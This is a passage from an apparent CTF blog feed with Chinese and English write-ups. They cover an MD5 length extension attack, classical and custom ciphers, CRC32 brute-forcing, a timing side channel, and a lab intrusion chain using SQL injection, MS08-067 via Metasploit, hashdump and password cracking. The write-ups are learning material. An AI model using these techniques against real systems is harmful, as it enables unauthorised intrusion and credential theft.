接著填充 &lt;code&gt;\x00&lt;/code&gt;&lt;br&gt;
最後 8 byte 補上原始長度 (bit)&lt;br&gt;
接著 md5 會有 4 個初始量  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;a=0x67452301
b=0xEFCDAB89
c=0x98BADCFE 
d=0x10325476
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;接著會以 a b c d 以及 block[i] 為參數&lt;br&gt;
做一系列的運算&lt;br&gt;
會得到另外四個值 aa bb cc dd&lt;br&gt;
並且將 a b c d 與 aa bb cc dd 做相加&lt;br&gt;
這個過程視為一個 round  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aa,bb,cc,dd = f(a,b,c,d,block[i])
a += aa
b += bb
c += cc
d += dd
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果後面還有 block 就繼續做運算&lt;br&gt;
直到沒有 block 為止&lt;br&gt;
a b c d 的最終值合併後就是 md5 的結果  &lt;/p&gt;
&lt;p&gt;如果 a b c d 的初始值改變的結果會如何 ?&lt;br&gt;
LEA 就是利用這點&lt;br&gt;
如果我們現在已知 &lt;code&gt;md5(nonce + num)&lt;/code&gt; 的結果&lt;br&gt;
將其結果還原為 a b c d&lt;br&gt;
並當作 function f 中 a b c d 的初始值&lt;br&gt;
做一次 &lt;code&gt;f(a,b,c,d,msg)&lt;/code&gt; 的運算&lt;br&gt;
結果等同於 &lt;code&gt;md5(nonce + num + padding + msg)&lt;/code&gt; &lt;br&gt;
所以即使不知道 &lt;code&gt;nonce + num&lt;/code&gt;&lt;br&gt;
也可以預測出結果  &lt;/p&gt;
&lt;p&gt;Talk is cheap, 先 reveal nonce 判斷是否可行：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nonce = &amp;quot;760c4a0f8ec61bec304ed4d8d8abeb98&amp;quot;.decode(&amp;#39;hex&amp;#39;)
num = &amp;#39;a\n&amp;#39;
md5(nonce + num) = &amp;#39;5b356daa0313063af25f8da01922128d&amp;#39;
a,b,c,d = md5tonum(md5(nonce + num))
# nonce = 16, a\n = 2, 所以填充\x80+\x00*37 + len 8, total = 64
padding = &amp;quot;\x80&amp;quot;+&amp;quot;\x00&amp;quot;*37 + &amp;quot;\x90&amp;quot;+&amp;quot;\x00&amp;quot;*7
print md5(&amp;#39;a\n&amp;#39;+padding+&amp;#39;b\n&amp;#39;)
block = [256511094 3961243278 3637792304 2565581784 8391265 0 0 0 0 0 0 0 0 0 144 0 8391266 0 0 0 0 0 0 0 0 0 0 0 0 0 528 0]
md5: 12b74d8200ff1c84500b1e55ada2ce7e 
print guess(&amp;#39;b\n&amp;#39;,a,b,c,d,66) # 新的長度是 66 byte
block = [8391266 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0]
md5: 12b74d8200ff1c84500b1e55ada2ce7e 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;剩下的難題就是怎麼樣得到 md5 的結果了&lt;br&gt;
把 odds 設成 100&lt;br&gt;
第一次送 'a\n' 得到 r1&lt;br&gt;
r1 = &lt;code&gt;md5 % 2\*\*100&lt;/code&gt;&lt;br&gt;
第二次送 'a\n' + padding + 'b\n' 得到 r2&lt;br&gt;
用 r1 推出 a b c d 並用 LEA 預測結果&lt;br&gt;
(a 用 brute-force 的方式去試)&lt;br&gt;
如果結果與 r2 相同&lt;br&gt;
就代表 a 的值是正確的&lt;br&gt;
也就得到完整的 md5 了  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;i_dunno_i_ran_out_of_clever_keys&lt;/code&gt;&lt;/p&gt;</content><category term="PlaidCTF"></category><category term="Length Extension Attack"></category></entry><entry><title>Plaid CTF 2014 Crypto 20 twenty</title><link href="https://ddaa.tw/plaidctf_crypto_20_twenty.html" rel="alternate"></link><published>2014-04-15T00:34:00+08:00</published><updated>2014-04-15T00:34:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-04-15:/plaidctf_crypto_20_twenty.html</id><summary type="html">&lt;p&gt;Try using English to write the solution down.&lt;br&gt;
However, my English is not so good.&lt;br&gt;
I hope to improve it through this method. :)  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The problem gave us a bzip2 file. We get the cipher in &lt;code&gt;twenty.txt&lt;/code&gt; after extracting it.  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;fvoxoxfvwdepagxmwxfpukleofxhwevefuygzepfvexwfvufgeyfryedojhwffoyhxcwgmlxeylawfxfurwfvoxecfezfvwbecpfpeejuygoyfefvwxfpwwfxojumwuxfuffvwawuxflecaazubwjwoyfvwyepfvwuxfhwfjlopwckaohvfjlzopwoaahevupgwpfvuywjoywjdwyfufjupouvbuaajwuaoupkecygjwoyfvwuxxdofvyeacmwbvuzoyhlecpwzcbroyhdofvfvwgcgwdveheffvwrwlxfelecpxuzwuygfvexwfvufbuyfgempoyhxcofxbplfelecpcybawxujfexwffawgoxkcfwxfvechvflecgfubrawfvoxdofvuaoffawjepwfubfmcffvwyuhuoyzcghwkubrwpxogeyfryediubroxvwgufwupwswplfojwofvoyrezaorxuyhmcfxvofjuyfvwlpwubepkepufoeyuygojukwpxeyozobufoeyezzpwwgejzepuaaleczoaagebrwfxaorwfvufxubeybwkfzepwohyfeluaadvoawaudlwpxjcggldufwpuygfpexxfuaaecfezmcxoywxxoxiuoazepjwuyglecpwxcoyhjwbosoaalwnvomoffvoxoyfvwbecpfpeejheeygeofogupwlecbeyhpufcaufoeyxfvwzauhoxxoybwywdbplkfejohvfvuswyxumubrgeepxocxweagbplkfe&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I didn't notice this text is encrypted by replacing …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Try using English to write the solution down.&lt;br&gt;
However, my English is not so good.&lt;br&gt;
I hope to improve it through this method. :)  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The problem gave us a bzip2 file. We get the cipher in &lt;code&gt;twenty.txt&lt;/code&gt; after extracting it.  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;fvoxoxfvwdepagxmwxfpukleofxhwevefuygzepfvexwfvufgeyfryedojhwffoyhxcwgmlxeylawfxfurwfvoxecfezfvwbecpfpeejuygoyfefvwxfpwwfxojumwuxfuffvwawuxflecaazubwjwoyfvwyepfvwuxfhwfjlopwckaohvfjlzopwoaahevupgwpfvuywjoywjdwyfufjupouvbuaajwuaoupkecygjwoyfvwuxxdofvyeacmwbvuzoyhlecpwzcbroyhdofvfvwgcgwdveheffvwrwlxfelecpxuzwuygfvexwfvufbuyfgempoyhxcofxbplfelecpcybawxujfexwffawgoxkcfwxfvechvflecgfubrawfvoxdofvuaoffawjepwfubfmcffvwyuhuoyzcghwkubrwpxogeyfryediubroxvwgufwupwswplfojwofvoyrezaorxuyhmcfxvofjuyfvwlpwubepkepufoeyuygojukwpxeyozobufoeyezzpwwgejzepuaaleczoaagebrwfxaorwfvufxubeybwkfzepwohyfeluaadvoawaudlwpxjcggldufwpuygfpexxfuaaecfezmcxoywxxoxiuoazepjwuyglecpwxcoyhjwbosoaalwnvomoffvoxoyfvwbecpfpeejheeygeofogupwlecbeyhpufcaufoeyxfvwzauhoxxoybwywdbplkfejohvfvuswyxumubrgeepxocxweagbplkfe&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I didn't notice this text is encrypted by replacing at first because there are not blanks or other symbols. I had no idea to solve it until jeffxx tell me &lt;code&gt;fvox&lt;/code&gt; = &lt;code&gt;this&lt;/code&gt;.  &lt;/p&gt;
&lt;p&gt;The usual way to break &lt;strong&gt;Substitution cipher&lt;/strong&gt; is find some repeat patterns in cipher. The patterns usually present a word in natual language, such as &lt;code&gt;the&lt;/code&gt;,&lt;code&gt;this&lt;/code&gt;, &lt;code&gt;in&lt;/code&gt; ... etc. The more pattern we can find, the more character we get.  &lt;/p&gt;
&lt;p&gt;However, this cipher does not have any blank or other symbols. It is hard to identify which pattern is the word. Therefore, I used a regular expression dictionary to assist me find a word that match the pattern.  &lt;/p&gt;
&lt;p&gt;For example, after we substituted 'fvoxw' to &lt;code&gt;thise&lt;/code&gt;, we could get a part of plain as below: (The capital letters were substituted.)  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;THISISTHEdepagSmESTpukleITShEeHeTuygzepTHeSETHuTgeyTryedIjhETTIyhScEgmlSeylaETSTurETHISecTe&lt;br&gt;
zTHEbecpTpeejuygIyTeTHESTpEETSIjumEuSTuTTHEaEuSTlecaazubEjEIyTHEyepTHEuSThETjlIpEckaIhHTjlzI&lt;br&gt;
pEIaaheHupgEpTHuyEjIyEjdEyTuTjupIuHbuaajEuaIupkecygjEIyTHEuSSdITHyeacmEbHuzIyhlecpEzcbrIyhdI&lt;br&gt;
....  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Observing the text, we could find some duplicate patterns, like &lt;code&gt;THeSE&lt;/code&gt;, &lt;code&gt;STpEET&lt;/code&gt;. I guessed that means &lt;code&gt;those&lt;/code&gt;, &lt;code&gt;street&lt;/code&gt;. If not sure which words match the pattern, we can use dictionary to search possible words. We could get &lt;code&gt;o&lt;/code&gt; and &lt;code&gt;r&lt;/code&gt;, and substitute them to cipher again.  &lt;/p&gt;
&lt;p&gt;We could use &lt;strong&gt;google&lt;/strong&gt; to search sentences after some characters were substiuted. Finally, I found the plaintext was a lyrics of rap from youtube ([https://www.youtube.com/watch?v=9iUvuaChDEg]). And the last sentence is &lt;strong&gt;CONGRATULATIONSTHEFLAGISSINCENEWCRYPTOMIGHTHAVENSABACKDOORSIUSEOLDCRYPTO&lt;/strong&gt;.  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;sincenewcryptomighthavensabackdoorsiuseoldcrypto&lt;/code&gt;&lt;/p&gt;</content><category term="PlaidCTF"></category><category term="Substitution Cipher"></category></entry><entry><title>ACTF 2014 Crypto 老大哥aay的秘密</title><link href="https://ddaa.tw/actf_forensic_100_aay_secret.html" rel="alternate"></link><published>2014-04-14T21:19:00+08:00</published><updated>2014-04-14T21:19:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-04-14:/actf_forensic_100_aay_secret.html</id><summary type="html">&lt;p&gt;期中考完了來補一下 ACTF write up&lt;br&gt;
打完 plaidctf 覺得自己跟 學長 Orange 217 等大大&lt;br&gt;
差距十分之大 Orz&lt;br&gt;
要花更多時間練習才行 QQ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題給了一個 rar 的檔案&lt;br&gt;
裡面包含 7 個檔案，每個 5 byte&lt;br&gt;
猜測應該是可以從 CRC32 brute-force 出結果&lt;br&gt;
測試一下&lt;br&gt;
&lt;code&gt;echo -ne 'ACTF' &amp;gt; tmp; crc32 tmp; cat tmp&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;76f37a57  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;跟 rar 的檔案吻合&lt;br&gt;
應該可以確認猜測無誤  &lt;/p&gt;
&lt;p&gt;接著要去 survey CRC32 的算法&lt;br&gt;
結果就找到現成的 code&lt;br&gt;
[http://www …&lt;/p&gt;</summary><content type="html">&lt;p&gt;期中考完了來補一下 ACTF write up&lt;br&gt;
打完 plaidctf 覺得自己跟 學長 Orange 217 等大大&lt;br&gt;
差距十分之大 Orz&lt;br&gt;
要花更多時間練習才行 QQ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題給了一個 rar 的檔案&lt;br&gt;
裡面包含 7 個檔案，每個 5 byte&lt;br&gt;
猜測應該是可以從 CRC32 brute-force 出結果&lt;br&gt;
測試一下&lt;br&gt;
&lt;code&gt;echo -ne 'ACTF' &amp;gt; tmp; crc32 tmp; cat tmp&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;76f37a57  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;跟 rar 的檔案吻合&lt;br&gt;
應該可以確認猜測無誤  &lt;/p&gt;
&lt;p&gt;接著要去 survey CRC32 的算法&lt;br&gt;
結果就找到現成的 code&lt;br&gt;
[http://www.opensource.apple.com/source/xnu/xnu-1456.1.26/bsd/libkern/crc32.c]&lt;br&gt;
open source 所以可以隨便改 XD&lt;br&gt;
改成 linux 的版本以後就可以開始跑了&lt;br&gt;
因為是 flag 所以應該只有 printable&lt;br&gt;
測試 32 ~ 126&lt;br&gt;
約 5 分鐘跑出結果  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;ACTF{ch3ck5um_l34k_y0ur_1nf0m4710n}&lt;/code&gt;  &lt;/p&gt;</content><category term="XCTF"></category></entry><entry><title>Cyber Readiness Challenge 2014 Level 1 Summary</title><link href="https://ddaa.tw/cyber_readiness_challenge_level1_summary.html" rel="alternate"></link><published>2014-04-02T22:51:00+08:00</published><updated>2014-04-02T22:51:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-04-02:/cyber_readiness_challenge_level1_summary.html</id><summary type="html">&lt;p&gt;今天跟 &lt;strong&gt;jeffxx&lt;/strong&gt; 和 &lt;strong&gt;atdog&lt;/strong&gt; 參加賽門鐵克主辦的 CTF&lt;br&gt;
見識到好多平常只有在網路上看過 id 的 大大 (worship)&lt;br&gt;
題目還滿有趣的~ 從中學到不少東西&lt;br&gt;
希望以後還會有機會參加 XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;故事背景是一個因為咖啡廳漲價而心生不滿的中二顧客&lt;br&gt;
決定黑咖啡廳的網路當作報復 (誤  &lt;/p&gt;
&lt;p&gt;題目環境給了一個 ip &lt;em&gt;10.1.1.10&lt;/em&gt;&lt;br&gt;
連過去會到咖啡廳的網站&lt;br&gt;
(因為題目環境是封閉的 所以只能稍微記錄一下做法了 &amp;gt;&amp;lt;)  &lt;/p&gt;
&lt;h2&gt;Problem 1 300&lt;/h2&gt;
&lt;p&gt;這題敘述是要找出咖啡廳是用什麼軟體架設的&lt;br&gt;
點開 source code 就看到註解裡面有記錄了&lt;br&gt;
flag: 忘了  &lt;/p&gt;
&lt;h2&gt;Problem 2 500&lt;/h2&gt;
&lt;p&gt;這題是要找到一個還沒使用過的優惠券&lt;br&gt;
點到網頁 &lt;em&gt;deals&lt;/em&gt; 的分類會看到兩個優惠券&lt;br&gt;
當然都不是 flag&lt;br&gt;
url 大概長這樣 &lt;code&gt;http://10 …&lt;/code&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;今天跟 &lt;strong&gt;jeffxx&lt;/strong&gt; 和 &lt;strong&gt;atdog&lt;/strong&gt; 參加賽門鐵克主辦的 CTF&lt;br&gt;
見識到好多平常只有在網路上看過 id 的 大大 (worship)&lt;br&gt;
題目還滿有趣的~ 從中學到不少東西&lt;br&gt;
希望以後還會有機會參加 XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;故事背景是一個因為咖啡廳漲價而心生不滿的中二顧客&lt;br&gt;
決定黑咖啡廳的網路當作報復 (誤  &lt;/p&gt;
&lt;p&gt;題目環境給了一個 ip &lt;em&gt;10.1.1.10&lt;/em&gt;&lt;br&gt;
連過去會到咖啡廳的網站&lt;br&gt;
(因為題目環境是封閉的 所以只能稍微記錄一下做法了 &amp;gt;&amp;lt;)  &lt;/p&gt;
&lt;h2&gt;Problem 1 300&lt;/h2&gt;
&lt;p&gt;這題敘述是要找出咖啡廳是用什麼軟體架設的&lt;br&gt;
點開 source code 就看到註解裡面有記錄了&lt;br&gt;
flag: 忘了  &lt;/p&gt;
&lt;h2&gt;Problem 2 500&lt;/h2&gt;
&lt;p&gt;這題是要找到一個還沒使用過的優惠券&lt;br&gt;
點到網頁 &lt;em&gt;deals&lt;/em&gt; 的分類會看到兩個優惠券&lt;br&gt;
當然都不是 flag&lt;br&gt;
url 大概長這樣 &lt;code&gt;http://10.1.1.10/xxxx/deals/1&lt;/code&gt;&lt;br&gt;
很直覺的去改一下後面的參數&lt;br&gt;
改成 0 就發現多噴一個優惠券&lt;br&gt;
也就是此題的 flag&lt;br&gt;
flag: 忘了  &lt;/p&gt;
&lt;h2&gt;Problem 3 1000&lt;/h2&gt;
&lt;p&gt;這題是要我們找出隱藏的菜單或 &lt;em&gt;shopadmin&lt;/em&gt; 的 password&lt;br&gt;
上一題的 url 有 &lt;code&gt;SQLi&lt;/code&gt; 的漏洞&lt;br&gt;
但是我用 &lt;strong&gt;sqlmap&lt;/strong&gt; 爆不出來 QQ&lt;br&gt;
在用掉一個有等於沒有的提示後 (try sql syntax in url ... 類似這樣)&lt;br&gt;
確定是 SQli 的漏洞&lt;br&gt;
手動塞 payload&lt;br&gt;
得到 &lt;em&gt;shopadmin&lt;/em&gt; 的 &lt;code&gt;md5(password)&lt;/code&gt;&lt;br&gt;
拿去反查後得到 flag&lt;br&gt;
flag: &lt;code&gt;brewster&lt;/code&gt;  &lt;/p&gt;
&lt;h2&gt;Problem 4 500&lt;/h2&gt;
&lt;p&gt;某個 file 記錄著可以存取 WIFI 的 &lt;strong&gt;access code&lt;/strong&gt;&lt;br&gt;
flag 是 file 的完整路徑&lt;br&gt;
這題也是在網頁上找了很久&lt;br&gt;
結果用了提示才知道是要用 ssh 連進去 ._.&lt;br&gt;
file 就在家目錄下&lt;br&gt;
flag: 忘了  &lt;/p&gt;
&lt;h2&gt;Problem 5 300&lt;/h2&gt;
&lt;p&gt;要求 WIFI &lt;strong&gt;access code&lt;/strong&gt;&lt;br&gt;
就在剛剛的檔案裡 送分題&lt;br&gt;
flag: 忘了  &lt;/p&gt;
&lt;h2&gt;Problem 6 500&lt;/h2&gt;
&lt;p&gt;前面一堆描述忘記是啥了&lt;br&gt;
總之要找出 &lt;em&gt;10.1.2.15&lt;/em&gt; 的 hostname&lt;br&gt;
原本以為是用剛剛 ssh 進的主機去反解&lt;br&gt;
結果不是 =.=&lt;br&gt;
這台有開 &lt;strong&gt;netbios&lt;/strong&gt; 的 port&lt;br&gt;
google 一下可以用 &lt;strong&gt;netscan&lt;/strong&gt; 去掃&lt;br&gt;
就得到 hostname 了&lt;br&gt;
flag: 忘了  &lt;/p&gt;
&lt;h2&gt;Problem 7 1000&lt;/h2&gt;
&lt;p&gt;打進去就對了 bj4&lt;br&gt;
這題用到的漏洞是 &lt;strong&gt;MS08-067&lt;/strong&gt;&lt;br&gt;
第一次用 &lt;strong&gt;metasploit&lt;/strong&gt; XD&lt;br&gt;
還好這題沒更動什麼&lt;br&gt;
照著教學做就過了&lt;br&gt;
可是我前面不小心按到這題的 hint ... 悲劇&lt;br&gt;
flag: &lt;code&gt;emploees.zip&lt;/code&gt;  &lt;/p&gt;
&lt;h2&gt;Problem 8 300&lt;/h2&gt;
&lt;p&gt;該題環境還有另一個帳號&lt;br&gt;
&lt;strong&gt;metasploit&lt;/strong&gt; 開啟 shell 以後&lt;br&gt;
用 &lt;code&gt;net user&lt;/code&gt; 列出所有使用者&lt;br&gt;
flag: &lt;code&gt;manager&lt;/code&gt;  &lt;/p&gt;
&lt;h2&gt;Problem 9 1000&lt;/h2&gt;
&lt;p&gt;第 8 題得到的帳戶似乎密碼可以被破解&lt;br&gt;
flag 就是密碼&lt;br&gt;
用 &lt;strong&gt;metasploit&lt;/strong&gt; 內建的 &lt;code&gt;hashdump&lt;/code&gt; 得到密碼的 shadow&lt;br&gt;
這題我用網路上的方式爆不出 &lt;strong&gt;NTLM&lt;/strong&gt; 的密碼&lt;br&gt;
改用提示的 &lt;strong&gt;John The Ripper&lt;/strong&gt; 就爆出來了&lt;br&gt;
flag: &lt;code&gt;COFFEE123&lt;/code&gt;  &lt;/p&gt;
&lt;h2&gt;Problem 10 1000&lt;/h2&gt;
&lt;p&gt;第 7 題的 zip 有加密&lt;br&gt;
要想辦法破出密碼&lt;br&gt;
用 &lt;strong&gt;metasploit&lt;/strong&gt; 內建的 download 得到 zip 檔&lt;br&gt;
嘗試使用 &lt;strong&gt;fcrackzip&lt;/strong&gt; 去破解...但是跑不出來&lt;br&gt;
因為時間不太夠只好打開 hint&lt;br&gt;
提示要用 dictionary&lt;br&gt;
上網找的字典檔要 4G 來不及下載了&lt;br&gt;
在開一個提示才知道原來 kali 已經自帶字典檔了&lt;br&gt;
用 &lt;code&gt;rockyou.txt&lt;/code&gt; 成功解出壓縮檔密碼 &lt;code&gt;blingbling&lt;/code&gt;&lt;br&gt;
flag 在檔案裏面&lt;br&gt;
flag: 忘了  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;LEVEL 2 是賽門鐵克的產品&lt;br&gt;
根本沒人想去試...&lt;br&gt;
給個 24 小時再說吧 XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;LEVEL 3&lt;br&gt;
我開了一個 hint 但是登不進去環境 Q_Q&lt;br&gt;
最後把 hint 全開照著指示還是進不去 WTF~~~&lt;br&gt;
結果是主辦方那邊的 bug ORZ&lt;br&gt;
在分秒必爭之際...我發呆了半小時 囧rz&lt;br&gt;
最後 LEVEL3 只解兩題  so sad&lt;br&gt;
早知道學 atdog 大大 直接找漏洞打 (誤  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;結束前 scoreboard 就關閉了&lt;br&gt;
不知道自己確切的名次&lt;br&gt;
估計應該在 10 名上下吧 &amp;gt;&amp;lt;&lt;br&gt;
還有很大的努力空間呀~~&lt;br&gt;
這次的題目類型跟平常打的 CTF 相差滿大的&lt;br&gt;
不過也學到很多工具的使用方式&lt;br&gt;
感謝&lt;strong&gt;賽門鐵克&lt;/strong&gt;主辦這次活動&lt;br&gt;
以及 &lt;strong&gt;TDOH&lt;/strong&gt; 的宣傳 讓我有渠道可以參加這次活動~  &lt;/p&gt;</content><category term="Other CTF"></category></entry><entry><title>VolgaCTF 2014 Crypto 100 Crypto100</title><link href="https://ddaa.tw/volgactf_crypto_100_crypto100.html" rel="alternate"></link><published>2014-03-31T01:14:00+08:00</published><updated>2014-03-31T01:14:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-03-31:/volgactf_crypto_100_crypto100.html</id><summary type="html">&lt;p&gt;crypto 只有解出 100 分而已&lt;br&gt;
其他都沒解出來...&lt;br&gt;
早知道去解別題了 ORZ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;密文是一個超級大的數字...  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;190569475701019412937705231680700513465015462478574872080026036707049434285377110377581884338050290774147519326077986327023814459562710938989987601622114027649584411501029597442404380535706287506751810630518137180840386095680950172667823654745784065
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;題目還有給一個遠端的加密程式&lt;br&gt;
試了一下規則有：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;非英文字母都 = 1 &lt;/li&gt;
&lt;li&gt;英文字母不分大小寫&lt;/li&gt;
&lt;li&gt;a=4, b=9, c=25, d=49, ..., z=10201&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;很輕易可以看出來對應的數字就是質數的平方&lt;br&gt;
但是如果兩個字元以上就還有一些變化&lt;br&gt;
ex： &lt;em&gt;a=4, aa=32, aaa=1024, aaaa=131072&lt;/em&gt;&lt;br&gt;
收集一些密文後可以推得遞迴式：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;F(d) = F(d-1) * prime[c] ^ 2 * prime[c] ^ prime[d]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;prime[] = 質數陣列, 2 …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;crypto 只有解出 100 分而已&lt;br&gt;
其他都沒解出來...&lt;br&gt;
早知道去解別題了 ORZ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;密文是一個超級大的數字...  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;190569475701019412937705231680700513465015462478574872080026036707049434285377110377581884338050290774147519326077986327023814459562710938989987601622114027649584411501029597442404380535706287506751810630518137180840386095680950172667823654745784065
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;題目還有給一個遠端的加密程式&lt;br&gt;
試了一下規則有：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;非英文字母都 = 1 &lt;/li&gt;
&lt;li&gt;英文字母不分大小寫&lt;/li&gt;
&lt;li&gt;a=4, b=9, c=25, d=49, ..., z=10201&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;很輕易可以看出來對應的數字就是質數的平方&lt;br&gt;
但是如果兩個字元以上就還有一些變化&lt;br&gt;
ex： &lt;em&gt;a=4, aa=32, aaa=1024, aaaa=131072&lt;/em&gt;&lt;br&gt;
收集一些密文後可以推得遞迴式：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;F(d) = F(d-1) * prime[c] ^ 2 * prime[c] ^ prime[d]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;prime[] = 質數陣列, 2, 3, 5, ...  &lt;/li&gt;
&lt;li&gt;d = 第 d 個字元  &lt;/li&gt;
&lt;li&gt;c = 字元 (ex: a = 0, b = 1, c = 2, ...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ex : &lt;em&gt;aaa = 32 (aa 的 值) * 4 (a 對應的值) * 2 ^ 5 (3rd prime) = 1024&lt;/em&gt;  &lt;/p&gt;
&lt;p&gt;我們可以把 cipher 做&lt;strong&gt;因式分解&lt;/strong&gt;&lt;br&gt;
所包含的質數就代表 plain 包含該字元&lt;br&gt;
並且計算其次方&lt;br&gt;
如果 &lt;em&gt;次方 - 2&lt;/em&gt; 是質數&lt;br&gt;
就表示是該字元只出現過一次  &lt;/p&gt;
&lt;p&gt;至此也就只能分析出用上的字元有 &lt;em&gt;a c e i l m n o p q r s t u v&lt;/em&gt;&lt;br&gt;
以及第三個字元是 &lt;em&gt;q&lt;/em&gt;&lt;br&gt;
某個字元是 &lt;em&gt;v&lt;/em&gt;&lt;br&gt;
某個字元是 &lt;em&gt;m&lt;/em&gt;&lt;br&gt;
其它會有 collision 無法正確判斷位置  &lt;/p&gt;
&lt;p&gt;直到提示給了 &lt;em&gt;plain text is a meaningful word&lt;/em&gt;&lt;br&gt;
抱著隨意嘗試的心態去找超級長的單字&lt;br&gt;
結果還真的有符合條件的 = =  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;aequeosalinocalcalinoceraceoaluminosocupreovitriolic&lt;/code&gt;  &lt;/p&gt;</content><category term="Other CTF"></category></entry><entry><title>VolgaCTF 2014 Exploit 100 Exploit100</title><link href="https://ddaa.tw/volgactf_exploit_100_exploit100.html" rel="alternate"></link><published>2014-03-31T00:48:00+08:00</published><updated>2014-03-31T00:48:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-03-31:/volgactf_exploit_100_exploit100.html</id><summary type="html">&lt;p&gt;突然被揪來玩的一次ctf XDD&lt;br&gt;
結果說好的養身又沒了 OTZ&lt;br&gt;
這次想嘗試解比較難的題目&lt;br&gt;
結果就是 very not work ....&lt;br&gt;
希望下次能解些分數比較高的題目 QQ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;一樣先看題目環境:   &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The password consists of 12 printable characters&lt;br&gt;
111111111111&lt;br&gt;
344  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;while(1){
  ...
  if ( v5 == 12 )
      break;
    v7 = rand() % 1000;
    for ( j = 0; j &amp;lt; v5; ++j )
    {
      for ( k = 1; (unsigned int)k &amp;lt;= 0xDEADBEEE; ++k )
        v7 = k ^ (k + v7);
    }
    sprintf(&amp;amp;s …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;突然被揪來玩的一次ctf XDD&lt;br&gt;
結果說好的養身又沒了 OTZ&lt;br&gt;
這次想嘗試解比較難的題目&lt;br&gt;
結果就是 very not work ....&lt;br&gt;
希望下次能解些分數比較高的題目 QQ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;一樣先看題目環境:   &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The password consists of 12 printable characters&lt;br&gt;
111111111111&lt;br&gt;
344  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;while(1){
  ...
  if ( v5 == 12 )
      break;
    v7 = rand() % 1000;
    for ( j = 0; j &amp;lt; v5; ++j )
    {
      for ( k = 1; (unsigned int)k &amp;lt;= 0xDEADBEEE; ++k )
        v7 = k ^ (k + v7);
    }
    sprintf(&amp;amp;s, &amp;quot;%x\n&amp;quot;, v7);
    write(fd, &amp;amp;s, strlen(&amp;amp;s));
  }
  write(fd, v10, strlen(v10));
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這題會接受 12 個字元&lt;br&gt;
然後跟 &lt;em&gt;password.txt&lt;/em&gt; 比對&lt;br&gt;
如果相同就會把 flag 印出來&lt;br&gt;
如果不同則會檢查有幾個字元是相同&lt;br&gt;
把結果存在變數 &lt;code&gt;v5&lt;/code&gt;&lt;br&gt;
接著對密碼做 v5 次的 xor 運算 然後把結果回傳&lt;br&gt;
比如說 答對兩個字元就會做兩次計算&lt;br&gt;
全部答錯則一次都不計算  &lt;/p&gt;
&lt;p&gt;想了一陣子突然發現這題根本不用知道運算的結果&lt;br&gt;
因為只要不是全部答錯就會花上好一段時間去算&lt;br&gt;
可以用是不是馬上回傳結果來判斷 &lt;code&gt;input == password&lt;/code&gt;&lt;br&gt;
